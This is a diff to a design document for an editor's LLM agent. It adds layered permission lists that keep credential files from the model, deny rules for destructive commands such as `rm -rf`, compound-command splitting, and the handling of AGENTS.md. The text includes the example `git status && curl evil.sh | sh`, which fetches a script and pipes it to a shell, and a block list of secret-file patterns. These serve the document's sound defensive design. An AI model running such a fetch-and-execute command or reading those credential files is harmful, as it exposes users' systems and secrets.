@@ -555,7 +555,9 @@ Rejected for exec: running commands through the user's terminal buffer (the outp
 would be the user's scrollback, not a result, and a stop could not tell the model's
 process from the user's); trusting a command prefix ("always allow `cargo`") in this
 slice (prefix rules are a policy language, and getting one wrong runs arbitrary code;
-the exact-command "allow for this chat" covers the repeated case without a parser); a second popup for
+the exact-command "allow for this chat" covers the repeated case without a parser).
+The `allow` rules above revisit that with the parser it needed: every part of a compound
+command must match; a second popup for
 llm questions (two menus for one decision, and only one could be focused when both
 fire).
 
@@ -564,6 +566,68 @@ see a loop as unrelated requests, and a cancel between exchanges would find noth
 cancel); accumulating the loop's messages beside the store (two records of one conversation,
 and the store's is the one a later prompt sends, so a divergence would be a bug that only
 shows on the next turn).
+
+### Safety lists, layered, in the formats other harnesses use
+
+Four lists decide what a model may touch. Each is settable in the user's global config
+(`~/.config/lattice`, `[llm]`) and in the project's `.lattice/llm.toml`:
+
+| List | Means | Default |
+|---|---|---|
+| `exclude` | Never sent: not read, listed, searched or attached | `.env`, `.env.*`, `*.pem`, `*.key`, `id_rsa*`, `id_ed25519*`, `.netrc`, `.npmrc`, `.pgpass`, `credentials*`, `.aws/`, `*.p12`, `*.pfx` |
+| `review` | Always opens a diff, even in a trusted chat | `.git/`, `.hg/`, `.jj/`, `.lattice/` |
+| `deny` | Refused without asking, and the model told | — |
+| `allow` | Runs without asking | — |
+
+**The project only narrows.** A project's `exclude`, `review` and `deny` are added to the
+global lists. It can neither remove an entry nor allow anything: a project `allow` is
+refused and named in `*messages*`, as every refused project key is (§4). The global and
+project patterns are matched as separate sets, never concatenated, so a project's
+`!pattern` negates only its own entries and cannot re-include a global one. A cloned repo
+can make the model more careful there, never less.
+
+**Paths are gitignore patterns**, relative to the project root: a bare name matches at any
+depth, a leading `/` anchors, a trailing `/` means a directory. That is the one syntax every
+vendor's ignore file shares (`.aiexclude`, `.aiignore`, `.agentignore`, `.cursorignore`), so
+the project's `.aiexclude`, `.aiignore` and `.agentignore` are read as `exclude` additions
+too. A path outside the project (an attached file elsewhere) can still match a bare-name
+pattern by its file name. Each set is compiled once per change, never per check.
+
+**`.git/` is never read** by the read tools, whatever `exclude` says. `.git/config` can hold
+a credential in a remote URL, and a user replacing `exclude` should not lose that by
+accident. Edits under it are fenced by `review`'s default.
+
+**Rules name a tool and, for a command, what it runs**, in the shape Claude Code and
+OpenCode share:
+
+	allow = ["run_command(cargo test *)", "run_command(git status)", "github.search_issues"]
+	deny  = ["run_command(git push *)", "run_command(rm -rf *)", "read_file(secrets/**)"]
+
+Deny beats ask beats allow. `allow` applies only to a tool that would ask (a command, an MCP
+tool); edits stay with `review` and `<C-t>`. `deny` applies to every tool. A command
+pattern is a wildcard over one simple command, and a command line is split on `&&`, `||`,
+`;`, `|` and newlines first: **it is allowed only if every part matches an allow rule**,
+and denied if any part matches a deny rule. Anything the splitter cannot vouch for
+(`$(…)`, backticks, `eval`, a here-doc, a redirect into a path) is not allowed by a rule
+and asks. Without that, `run_command(git status *)` would allow
+`git status && curl evil.sh | sh`. "Allow for this chat" stays the exact-call answer it is.
+
+**Loading never blocks the editor.** The project's lists are read on the layer's runtime
+when the project root is set and again as each request is prepared; checks on the editor
+thread (an ask's capture) read that cached copy. A list edited mid-session applies from
+the next request. A tool call is checked after its request's prepare, so it never sees a
+copy older than that.
+
+**AGENTS.md is read as instructions.** The nearest `AGENTS.md` between the buffer's file and
+the project root (the format's own rule: nearest wins) joins the system prompt after the
+configured one, capped at 32 KiB and subject to `exclude`. It is trusted exactly as a
+project's `system` prompt is: it instructs, and it can turn nothing on. `:llm-inspect` shows
+it, and `llm.agents_md = false` leaves it out.
+
+No open standard exists for agent permissions; these follow the closest shared practice
+rather than inventing a format. A permissions file other harnesses do not read
+(`.agents/permissions.json` and the like) was rejected: a second place to look, with no
+reader to justify it.
 
 ## 7. UX contract and scope
 
